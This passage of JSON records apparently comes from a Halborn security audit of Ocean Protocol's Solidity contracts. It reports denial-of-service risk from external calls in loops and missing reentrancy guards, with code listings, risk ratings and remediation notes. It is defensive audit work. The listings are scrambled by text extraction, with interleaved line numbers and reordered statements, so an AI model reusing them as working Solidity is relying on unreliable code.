        "body": "External calls within a loop increase Gas usage or can lead to a denial- In some discovered functions, there is a for loop of-service attack. where multiple external calls are executed. If the integer index variable within the loop evaluates at large numbers, a denial of service could occur. Code Location: ERC721Factory Listing 15: ERC721Factory.sol (Lines 473,474,479,480,481,482,483,484 ,489,490,491,492,493,494,497,498,499,500,501,503,504,505,506,507,508 ,509,510) 466 467 468 469 470 function startMultipleTokenOrder ( tokenOrder [] memory orders ) external { uint256 ids = orders . length ; // TO DO . We can do better here , by groupping  publishMarketFeeTokens and consumeFeeTokens and have a single 471 472 473 // transfer for each one , instead of doing it per dt .. for ( uint256 i = 0; i < ids ; i ++) { ( address publishMarketFeeAddress , address  publishMarketFeeToken , uint256 publishMarketFeeAmount ) 474 = IERC20Template ( orders [ i ]. tokenAddress ).  getPublishingMarketFee () ; 475 476 // check if we have publishFees , if so transfer them  to us and approve dttemplate to take them 477 if ( publishMarketFeeAmount > 0 &&  publishMarketFeeToken != address (0) 478 && publishMarketFeeAddress != address (0) ) { 34 479 require ( IERC20Template ( publishMarketFeeToken ).  transferFrom ( 480 481 482 483 484 msg . sender , address ( this ) , publishMarketFeeAmount ) , ' Failed to transfer publishFee '); IERC20Template ( publishMarketFeeToken ). approve (  orders [i ]. tokenAddress , publishMarketFeeAmount ); 485 486 } // check if we have consumeFees , if so transfer them  to us and approve dttemplate to take them 487 if ( orders [ i ]. consumeFeeAmount > 0 && orders [ i ].  consumeFeeToken != address (0) 488 489 && orders [ i ]. consumeFeeAddress != address (0) ) { require ( IERC20Template ( orders [ i ]. consumeFeeToken ).  transferFrom ( 490 491 492 493 494 msg . sender , address ( this ) , orders [i ]. consumeFeeAmount ) , ' Failed to transfer consumeFee '); IERC20Template ( orders [i ]. consumeFeeToken ). approve (  orders [i ]. tokenAddress , orders [ i ]. consumeFeeAmount ); 495 496 497 } // transfer erc20 datatoken from consumer to us require ( IERC20Template ( orders [ i ]. tokenAddress ).  transferFrom ( 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 msg . sender , address ( this ) , orders [ i ]. amount ) , ' Failed to transfer datatoken '); IERC20Template ( orders [ i ]. tokenAddress ). startOrder ( orders [ i ]. consumer , orders [ i ]. amount , orders [ i ]. serviceId , orders [ i ]. consumeFeeAddress , orders [ i ]. consumeFeeToken , orders [ i ]. consumeFeeAmount ); } } FactoryRouter 35 Listing 16: FactoryRouter.sol (Lines 271,273,275,276,277,278,279,280 ,281,284,287,288,290,292,294,295,296,297,298,299,301,302,306,307,309 ,310,311,314,316,318,319,321,324,325) 262 263 264 265 266 267 268 269 function buyDTBatch ( Operations [] calldata _operations ) external { for ( uint i = 0; i < _operations . length ; i ++) { if ( _operations [ i ]. operation == operationType .  SwapExactIn ) { 270 271 // Get amountIn from user to router IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , _operations [ i ]. amountsIn ); 272 273 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , _operations [ i ]. amountsIn ); 274 275 276 277 278 279 280 281 282 283 284 // Perform swap ( uint amountReceived ,) = IPool ( _operations [i ]. source ) . swapExactAmountIn ( _operations [ i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // transfer token swapped to user require ( IERC20 ( _operations [i ]. tokenOut ).  transfer ( msg . sender , amountReceived ) , ' Failed MultiSwap '); 285 } else if ( _operations [ i ]. operation ==  operationType . SwapExactOut ){ 286  exact Out 287 288 // calculate how much amount In we need for uint amountIn = IPool ( _operations [ i ]. source ) . getAmountInExactOut ( _operations [ i ]. tokenIn ,  _operations [ i ]. tokenOut , _operations [i ]. amountsOut ); 289 290 // pull amount In from user IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , amountIn ); 291 292 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , amountIn ); 36 293 294 295 296 297 298 299 300 301 302 // perform swap IPool ( _operations [i ]. source ) . swapExactAmountOut ( _operations [i ]. tokenIn , _operations [ i ]. amountsIn , _operations [ i ]. tokenOut , _operations [ i ]. amountsOut , _operations [ i ]. maxPrice ); // send amount out back to user require ( IERC20 ( _operations [i ]. tokenOut ) . transfer ( msg . sender , _operations [ i ]. amountsOut  ) , ' Failed MultiSwap '); 303 304 } else if ( _operations [ i ]. operation ==  operationType . FixedRate ) { 305 306 307 // get datatoken address (, address datatoken , , , , , , , , , ,) = IFixedRateExchange ( _operations [ i ]. source ).  getExchange ( _operations [i ]. exchangeIds ); 308 309 310 311 // get tokenIn amount required for dt out ( uint baseTokenAmount , , ,) = IFixedRateExchange ( _operations [ i ]. source ). calcBaseInGivenOutDT ( _operations [ i ].  exchangeIds , _operations [i ]. amountsOut ); 312 313 314 // pull tokenIn amount IERC20 ( _operations [ i ]. tokenIn ). transferFrom (  msg . sender , address ( this ) , baseTokenAmount ); 315 316 // we approve pool to pull token from router IERC20 ( _operations [ i ]. tokenIn ). approve (  _operations [ i ]. source , baseTokenAmount ); 317 318 319 // perform swap IFixedRateExchange ( _operations [ i ]. source ) . buyDT ( _operations [ i ]. exchangeIds , _operations [  i ]. amountsOut , _operations [ i ]. amountsIn ); 320 321 // send dt out to user IERC20 ( datatoken ). transfer ( msg . sender ,  _operations [ i ]. amountsOut ); 322 323 324 325 } else { IDispenser ( _operations [ i ]. source ) . dispense ( _operations [ i ]. tokenOut , _operations [  i ]. amountsOut , msg . sender ); 326 327 } 37 328 329 330 } } ERC721Template Listing 17: ERC721Template.sol (Line 450) function _cleanERC20Permissions ( uint256 length ) internal { for ( uint256 i = 0; i < length ; i ++) { IERC20Template ( deployedERC20List [ i ]) . cleanFrom721 () ; } } 448 449 450 451 452 BPool Listing 18: BPool.sol (Line 257) 252 253 254 255 256 257 258 259 function collectOPF () external { address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = communityFees [ tokens [i ]]; communityFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( _opfCollector , amount ); } } Listing 19: BPool.sol (Line 268) 261 262 function collectMarketFee ( address to ) external { require ( _marketCollector == msg . sender , \" ONLY MARKET  COLLECTOR \"); 263 264 265 266 267 268 269 270 address [] memory tokens = getFinalTokens () ; for ( uint256 i = 0; i < tokens . length ; i ++) { uint256 amount = marketFees [ tokens [i ]]; marketFees [ tokens [i ]] = 0; IERC20 ( tokens [ i ]) . transfer ( to , amount ); } } 38 Risk Level: Likelihood - 2 Impact - 4 Recommendation: If possible, use pull over push strategy for external calls. Please refer to the reference section for more details. Reference: External Calls Recommendation Remediation Plan: PARTIALLY SOLVED: The Ocean Protocol team amended loops to include a maximum amount of iterations for certain functions that can be called externally. The following functions were not modified:  CollectMarketFee and CollectOPF in the BPool contract.  CleanERC20Permissions in the ERC721Template contract. 39 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Testing revealed that within some in-scope contracts, the non-reentrancy guard was missing for functions that handled token transfers. The fol- lowing list presents the contracts and functions where the guard was missing.  BPool.sol:  exitswapExternAmountOut, exitswapPoolAmountIn, joinswapExternAmountIn , joinswapPoolAmountOut, setup  Dispenser.sol:  dispense, ownerWithdraw  ERC20Template.sol:  deployPool  ERC721Factory.sol:  createNftErcWithDispenser, createNftErcWithFixedRate, createNftErcWithPool, createNftWithErc, deployERC721Contract  ERC721Template.sol:  createERC20  FixedRateExchange.sol:  buyDT, collectBT, collectDT, collectMarketFee, collectOceanFee , sellDT  SideStaking.sol:  getVesting, newDataTokenCreated, notifyFinalize, and Stake Furthermore, in these function, persistent state reading and writing followed external calls, as well as emitting events after the call, making it vulnerable to a Reentrancy attack. 40 Code Location: Listing 20: FixedRateExchange.sol (Lines 364,365,366,367,368,369,370 ,371,373,374,375,395,396) 333 function buyDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 maxBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( 334 335 336 337 338 339 340 341 342 343  , 344  swap \" 345 346 347 348 349 350 351 352 353 354 355 356 357 dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseInGivenOutDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount <= maxBaseTokenAmount , \" FixedRateExchange : Too many base tokens \" ); // we account fees , fees are always collected in  basetoken 358 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 359 360 361 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 362 363 364 365 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ). 41  transferFrom ( 366 367 msg . sender , address ( this ) , // we send basetoken to this  address , then exchange owner can withdraw 368 369 370 baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" ); exchanges [ exchangeId ]. btBalance = ( exchanges [ exchangeId ].  btBalance ). add ( 374 375 376 377 378 379 380 baseTokenAmountBeforeFee ); if ( dataTokenAmount > exchanges [ exchangeId ]. dtBalance ) { // first , let 's try to mint if ( exchanges [ exchangeId ]. withMint && IERC20Template ( exchanges [ exchangeId ]. dataToken ).  isMinter ( address ( this )) ) 381 382 { IERC20Template ( exchanges [ exchangeId ]. dataToken ).  mint ( msg . sender , dataTokenAmount ); } else { require ( 371 372 373 383 384 385 386  ). transferFrom ( 387 388 389 390 391  dataToken contract \" IERC20Template ( exchanges [ exchangeId ]. dataToken exchanges [ exchangeId ]. exchangeOwner , msg . sender , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the 392 393 394 395 ); } } else { exchanges [ exchangeId ]. dtBalance = ( exchanges [  exchangeId ]. dtBalance ) 396 397  transfer ( 398 399 . sub ( dataTokenAmount ); IERC20Template ( exchanges [ exchangeId ]. dataToken ). msg . sender , dataTokenAmount 42 400 401 402 403 404 405 406 407 408 409 410 411 412 ); } emit Swapped ( exchangeId , msg . sender , baseTokenAmount , dataTokenAmount , exchanges [ exchangeId ]. dataToken , marketFeeAmount , oceanFeeAmount ); } Listing 21: FixedRateExchange.sol (Lines 452,453,454,455,456,457,458 ,459,461,462,463,475,476) 421 function sellDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 minBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( 422 423 424 425 426 427 428 429 430 431  , 432  swap \" 433 434 435 436 437 438 439 440 441 442 443 dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseOutGivenInDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount >= minBaseTokenAmount , \" FixedRateExchange : Too few base tokens \" 43 444 445 ); // we account fees , fees are always collected in  basetoken 446 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 447 448 449 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 450 451 452 453 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. dataToken ).  transferFrom ( 454 455 456 457 458 msg . sender , address ( this ) , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  dataToken contract \" ); 459 460 461 exchanges [ exchangeId ]. dtBalance = ( exchanges [ exchangeId ].  dtBalance ). add ( 462 463 464 465 466 467 dataTokenAmount ); if ( baseTokenAmount > exchanges [ exchangeId ]. btBalance ) { require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ).  transferFrom ( 468 469 470 471 472 exchanges [ exchangeId ]. exchangeOwner , msg . sender , baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" 473 474 475 ); } else { exchanges [ exchangeId ]. btBalance = ( exchanges [  exchangeId ]. btBalance ) 476 477  transfer ( . sub ( baseTokenAmountBeforeFee ); IERC20Template ( exchanges [ exchangeId ]. baseToken ). 44 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 msg . sender , baseTokenAmount ); } emit Swapped ( exchangeId , msg . sender , baseTokenAmount , dataTokenAmount , exchanges [ exchangeId ]. baseToken , marketFeeAmount , oceanFeeAmount ); } Listing 22: SideStaking.sol (Lines 258,259) 245 246 247 248 249 250 251 252 function Stake ( address datatokenAddress , address stakeToken , uint256 amount ) public { if ( _datatokens [ datatokenAddress ]. bound != true ) return ; require ( msg . sender == _datatokens [ datatokenAddress ].  poolAddress , 253 254 255 256 257 258 \" ERR : Only pool can call this \" ); bool ok = canStake ( datatokenAddress , stakeToken , amount ); if ( ok != true ) return ; IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  amount ); 259 260 } _datatokens [ datatokenAddress ]. datatokenBalance -= amount ; Listing 23: SideStaking.sol (Lines 390,391,392) 357 358 359 360 function getVesting ( address datatokenAddress ) public { require ( _datatokens [ datatokenAddress ]. bound == true , \" ERR : Invalid datatoken \" 45 361 362 363 ); // is this needed ? // require ( msg . sender == _datatokens [ datatokenAddress ].  publisherAddress , ' ERR : Only publisher can call this ') ; 364 365 366 367 368 // calculate how many tokens we need to vest to publisher << uint256 blocksPassed ; if ( _datatokens [ datatokenAddress ]. vestingEndBlock < block .  number ) { 369 370 371 372 373 374 375 376 377 378 blocksPassed = _datatokens [ datatokenAddress ]. vestingEndBlock - _datatokens [ datatokenAddress ]. vestingLastBlock ; } else { blocksPassed = block . number - _datatokens [ datatokenAddress ]. vestingLastBlock ; } uint256 vestPerBlock = _datatokens [ datatokenAddress ].  vestingAmount . div ( 379 380 381 382 383 384 385 386 _datatokens [ datatokenAddress ]. vestingEndBlock - _datatokens [ datatokenAddress ]. blockDeployed ); if ( vestPerBlock == 0) return ; uint256 amount = blocksPassed . mul ( vestPerBlock ); if ( amount > 0 && _datatokens [ datatokenAddress ]. datatokenBalance >= ) {  amount 387 388 389  . number ; IERC20Template dt = IERC20Template ( datatokenAddress ); _datatokens [ datatokenAddress ]. vestingLastBlock = block 390 dt . transfer ( _datatokens [ datatokenAddress ].  publisherAddress , amount ); 391 _datatokens [ datatokenAddress ]. datatokenBalance -=  amount ; 392  amount ; 393 394 } } _datatokens [ datatokenAddress ]. vestingAmountSoFar += 46 Listing 24: SideStaking.sol (Lines 322,326,327,328,329,333,334,335,336 ,337,338,339,340,342,343) 302 function notifyFinalize ( address datatokenAddress , uint256  decimals ) internal { 303 304 305 306  return ; 307 308 309 310 311 312 313 314  rate * 315 316 317 318 319 320 321 322 if ( _datatokens [ datatokenAddress ]. bound != true ) return ; if ( _datatokens [ datatokenAddress ]. poolFinalized == true ) _datatokens [ datatokenAddress ]. poolFinalized = true ; uint256 baseTokenWeight = 5 * BASE ; // pool weight : 50 -50 uint256 dataTokenWeight = 5 * BASE ; // pool weight : 50 -50 uint256 baseTokenAmount = _datatokens [ datatokenAddress ] . basetokenBalance ; // given the price , compute dataTokenAmount uint256 dataTokenAmount = (( _datatokens [ datatokenAddress ]. baseTokenAmount * dataTokenWeight ) / baseTokenWeight / BASE ) * (10**(18 - decimals )) ; // approve the tokens and amounts IERC20Template dt = IERC20Template ( datatokenAddress ); dt . approve ( _datatokens [ datatokenAddress ]. poolAddress ,  dataTokenAmount ); 323 324 325 326 327 328 329 330 331  pool IERC20Template dtBase = IERC20Template ( _datatokens [ datatokenAddress ]. basetokenAddress ); dtBase . approve ( _datatokens [ datatokenAddress ]. poolAddress , baseTokenAmount ); // call the pool , bind the tokens , set the price , finalize 332 IPool pool = IPool ( _datatokens [ datatokenAddress ].  poolAddress ); 333 334 335 336 337 pool . setup ( datatokenAddress , dataTokenAmount , dataTokenWeight , _datatokens [ datatokenAddress ]. basetokenAddress , 47 338 339 340 341 342 baseTokenAmount , baseTokenWeight ); // substract _datatokens [ datatokenAddress ]. basetokenBalance -=  baseTokenAmount ; 343 _datatokens [ datatokenAddress ]. datatokenBalance -=  dataTokenAmount ; 344 345 346 347 348 349 350 351 352 353 354 // send 50% of the pool shares back to the publisher IERC20Template lPTokens = IERC20Template ( _datatokens [ datatokenAddress ]. poolAddress ); uint256 lpBalance = lPTokens . balanceOf ( address ( this )) ; // uint256 balanceToTransfer = lpBalance . div (2) ; lPTokens . transfer ( _datatokens [ datatokenAddress ]. publisherAddress , lpBalance . div (2) ); } Listing 25: Dispenser.sol (Lines 220,227,228) 187 function dispense ( address datatoken , uint256 amount , address  destination ) external payable { 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206  , require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. active == true , ' Dispenser not active ' ); require ( amount > 0, ' Invalid zero amount ' ); require ( datatokens [ datatoken ]. maxTokens >= amount , ' Amount too high ' ); if ( datatokens [ datatoken ]. allowedSwapper != address (0) ) { require ( datatokens [ datatoken ]. allowedSwapper == msg . sender 48 207 208 209 210 211 212 \" This address is not allowed to request DT \" ); } IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 callerBalance = tokenInstance . balanceOf (  destination ); 213 214 215 216 217  ); 218  this ))){ 219 220 221 222 223 224 225 226 227 228 229 } require ( callerBalance < datatokens [ datatoken ]. maxBalance , ' Caller balance too high ' ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance < amount && tokenInstance . isMinter ( address ( // we need to mint the difference if we can tokenInstance . mint ( address ( this ) , amount - ourBalance ); ourBalance = tokenInstance . balanceOf ( address ( this )); } require ( ourBalance >= amount , ' Not enough reserves ' ); tokenInstance . transfer ( destination , amount ); emit TokensDispensed ( datatoken , destination , amount ); Listing 26: Dispenser.sol (Lines 248,249) 236 237 238 239 240 241 242 243 244 245 246  ); 247 248 249 function ownerWithdraw ( address datatoken ) external { require ( datatoken != address (0) , ' Invalid token contract address ' ); require ( datatokens [ datatoken ]. owner == msg . sender , ' Invalid owner ' ); IERC20Template tokenInstance = IERC20Template ( datatoken ); uint256 ourBalance = tokenInstance . balanceOf ( address ( this ) if ( ourBalance >0) { tokenInstance . transfer ( msg . sender , ourBalance ); emit OwnerWithdrawed ( datatoken , msg . sender , ourBalance 49  ); 250 251 } } Listing 27: FixedRateExchange.sol (Lines 364,365,366,367,368,369,370 ,371,382,385,386,387,388,389,390,391,392,397,398,399,400,403,404,405 ,406,407,408,409,410,411) 333 function buyDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 maxBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseInGivenOutDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount <= maxBaseTokenAmount , \" FixedRateExchange : Too many base tokens \" ); // we account fees , fees are always collected in 334 335 336 337 338 339 340 341 342 343  , 344  swap \" 345 346 347 348 349 350 351 352 353 354 355 356 357  basetoken 358 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 359 360 361 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 50 362 363 364 365 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ).  transferFrom ( 366 367 msg . sender , address ( this ) , // we send basetoken to this  address , then exchange owner can withdraw 368 369 370 baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" ); exchanges [ exchangeId ]. btBalance = ( exchanges [ exchangeId ].  btBalance ). add ( 374 375 376 377 378 379 380 baseTokenAmountBeforeFee ); if ( dataTokenAmount > exchanges [ exchangeId ]. dtBalance ) { // first , let 's try to mint if ( exchanges [ exchangeId ]. withMint && IERC20Template ( exchanges [ exchangeId ]. dataToken ).  isMinter ( address ( this )) ) 381 382 { IERC20Template ( exchanges [ exchangeId ]. dataToken ).  mint ( msg . sender , dataTokenAmount ); } else { require ( 371 372 373 383 384 385 386  ). transferFrom ( 387 388 389 390 391  dataToken contract \" IERC20Template ( exchanges [ exchangeId ]. dataToken exchanges [ exchangeId ]. exchangeOwner , msg . sender , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the 392 393 394 395 ); } } else { exchanges [ exchangeId ]. dtBalance = ( exchanges [  exchangeId ]. dtBalance ) 396 . sub ( dataTokenAmount ); 51 397 IERC20Template ( exchanges [ exchangeId ]. dataToken ).  transfer ( 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 msg . sender , dataTokenAmount ); } emit Swapped ( exchangeId , msg . sender , baseTokenAmount , dataTokenAmount , exchanges [ exchangeId ]. dataToken , marketFeeAmount , oceanFeeAmount ); } Listing 28: FixedRateExchange.sol (Lines 500,501,502,503,505,506,507 ,508,509,510) 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 function collectBT ( bytes32 exchangeId ) external onlyExchangeOwner ( exchangeId ) { uint256 amount = exchanges [ exchangeId ]. btBalance ; exchanges [ exchangeId ]. btBalance = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); emit TokenCollected ( exchangeId , exchanges [ exchangeId ]. exchangeOwner , exchanges [ exchangeId ]. baseToken , amount ); } 52 Listing 29: FixedRateExchange.sol (Lines 519,520,521,522,524,525,526 ,527,528,529) 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 function collectDT ( bytes32 exchangeId ) external onlyExchangeOwner ( exchangeId ) { uint256 amount = exchanges [ exchangeId ]. dtBalance ; exchanges [ exchangeId ]. dtBalance = 0; IERC20Template ( exchanges [ exchangeId ]. dataToken ). transfer ( exchanges [ exchangeId ]. exchangeOwner , amount ); emit TokenCollected ( exchangeId , exchanges [ exchangeId ]. exchangeOwner , exchanges [ exchangeId ]. dataToken , amount ); } Listing 30: FixedRateExchange.sol (Lines 536,537,538,539,540,541,542 ,543,544) 532 533 function collectMarketFee ( bytes32 exchangeId ) external { // anyone call call this function , because funds are sent  to the correct address 534 535 536 537 538 539 540 541 542 543 544 545 uint256 amount = exchanges [ exchangeId ]. marketFeeAvailable ; exchanges [ exchangeId ]. marketFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( exchanges [ exchangeId ]. marketFeeCollector , amount ); emit MarketFeeCollected ( exchangeId , exchanges [ exchangeId ]. baseToken , amount ); } 53 Listing 31: FixedRateExchange.sol (Lines 551,552,553,554,555,556,557 ,558,559) 547 548 function collectOceanFee ( bytes32 exchangeId ) external { // anyone call call this function , because funds are sent  to the correct address 549 550 551 552 553 554 555 556 557 558 559 560 uint256 amount = exchanges [ exchangeId ]. oceanFeeAvailable ; exchanges [ exchangeId ]. oceanFeeAvailable = 0; IERC20Template ( exchanges [ exchangeId ]. baseToken ). transfer ( opfCollector , amount ); emit OceanFeeCollected ( exchangeId , exchanges [ exchangeId ]. baseToken , amount ); } Listing 32: FixedRateExchange.sol (Lines 452,453,454,455,456,457,458 ,459,466,467,468,469,470,471,472,473,477,478,479,480,483,484,485,486 ,487,488,489,490,491) 421 function sellDT ( bytes32 exchangeId , uint256 dataTokenAmount ,  uint256 minBaseTokenAmount ) external onlyActiveExchange ( exchangeId ) { require ( dataTokenAmount != 0 , \" FixedRateExchange : zero data token amount \" ); if ( exchanges [ exchangeId ]. allowedSwapper != address (0) ) { require ( exchanges [ exchangeId ]. allowedSwapper == msg . sender \" FixedRateExchange : This address is not allowed to ); } ( uint256 baseTokenAmount , uint256 baseTokenAmountBeforeFee , 54 422 423 424 425 426 427 428 429 430 431  , 432  swap \" 433 434 435 436 437 438 439 440 441 442 443 444 445 uint256 oceanFeeAmount , uint256 marketFeeAmount ) = calcBaseOutGivenInDT ( exchangeId , dataTokenAmount ); require ( baseTokenAmount >= minBaseTokenAmount , \" FixedRateExchange : Too few base tokens \" ); // we account fees , fees are always collected in  basetoken 446 exchanges [ exchangeId ]. oceanFeeAvailable = exchanges [  exchangeId ] 447 448 449 . oceanFeeAvailable . add ( oceanFeeAmount ); exchanges [ exchangeId ]. marketFeeAvailable = exchanges [  exchangeId ] 450 451 452 453 . marketFeeAvailable . add ( marketFeeAmount ); require ( IERC20Template ( exchanges [ exchangeId ]. dataToken ).  transferFrom ( 454 455 456 457 458 msg . sender , address ( this ) , dataTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  dataToken contract \" ); 459 460 461 exchanges [ exchangeId ]. dtBalance = ( exchanges [ exchangeId ].  dtBalance ). add ( 462 463 464 465 466 467 dataTokenAmount ); if ( baseTokenAmount > exchanges [ exchangeId ]. btBalance ) { require ( IERC20Template ( exchanges [ exchangeId ]. baseToken ).  transferFrom ( 468 469 470 471 472 exchanges [ exchangeId ]. exchangeOwner , msg . sender , baseTokenAmount ) , \" FixedRateExchange : transferFrom failed in the  baseToken contract \" 473 ); 55 474 475 } else { exchanges [ exchangeId ]. btBalance = ( exchanges [  exchangeId ]. btBalance ) 476 477  transfer ( . sub ( baseTokenAmountBeforeFee ); IERC20Template ( exchanges [ exchangeId ]. baseToken ). 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 msg . sender , baseTokenAmount ); } emit Swapped ( exchangeId , msg . sender , baseTokenAmount , dataTokenAmount , exchanges [ exchangeId ]. baseToken , marketFeeAmount , oceanFeeAmount ); } Listing 33: SideStaking.sol (Lines 104,109,110,111,112,113,114,115,116 ,117,118,119,120,121,122,123,124,125) 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 function newDataTokenCreated ( address datatokenAddress , address basetokenAddress , address poolAddress , address publisherAddress , uint256 [] memory ssParams ) external onlyRouter returns ( bool ) { // check if we are the controller of the pool require ( poolAddress != address (0) , \" Invalid poolAddress \"); IPool bpool = IPool ( poolAddress ); require ( bpool . getController () == address ( this ) , \" We are not the pool controller \" ); // check if the tokens are bound require ( bpool . getDataTokenAddress () == datatokenAddress , \" DataToken address missmatch \" 56 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 ); require ( bpool . getBaseTokenAddress () == basetokenAddress , \" BaseToken address missmatch \" ); // check if we are the minter of DT IERC20Template dt = IERC20Template ( datatokenAddress ); require ( ( dt . permissions ( address ( this )) ). minter == true , \" BaseToken address mismatch \" ); // get cap and mint it .. dt . mint ( address ( this ) , dt . cap () ); require ( dt . balanceOf ( address ( this )) == dt . totalSupply () , \"  Mint failed \" ); 107 require ( dt . totalSupply () . div (10) >= ssParams [2] , \" Max  vesting 10% \" ); 108  go 109 110 111 112 113 114 // we are rich :) let 's setup the records and we are good to _datatokens [ datatokenAddress ] = Record ({ bound : true , basetokenAddress : basetokenAddress , poolAddress : poolAddress , poolFinalized : false , datatokenBalance : dt . totalSupply () - ssParams [2] , //  We need to remove the vesting amount from that 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 datatokenCap : dt . cap () , basetokenBalance : ssParams [4] , lastPrice : 0, rate : ssParams [0] , publisherAddress : publisherAddress , blockDeployed : block . number , vestingEndBlock : block . number + ssParams [3] , vestingAmount : ssParams [2] , vestingLastBlock : block . number , vestingAmountSoFar : 0 }) ; notifyFinalize ( datatokenAddress , ssParams [1]) ; return ( true ); } 57 Risk Level: Likelihood - 1 Impact - 4 Recommendation: To protect against cross-functional reentrancy attacks, it may be nec- essary to use a mutex. By using this lock, an attacker can no longer OpenZeppelin has its own exploit the function with a recursive call. mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Ocean Protocol should consider refactoring the code to follow the checks- effects-interactions pattern and use the nonReentrant modifier. See the references section for more information. References: Checks-Effect-Interactions pattern Remediation Plan: PARTIALLY SOLVED: The Ocean Protocol team added the reentrancy protection guard on all external functions that any user could call. It was decided not to implement protection on internal functions and functions that can be called by a privileged user. An additional function where guard was not implemented was deployErc721Contract within the ERC721Factory contract. 58 ",
        "labels": [
            "Halborn",
            "Ocean_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Ocean_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
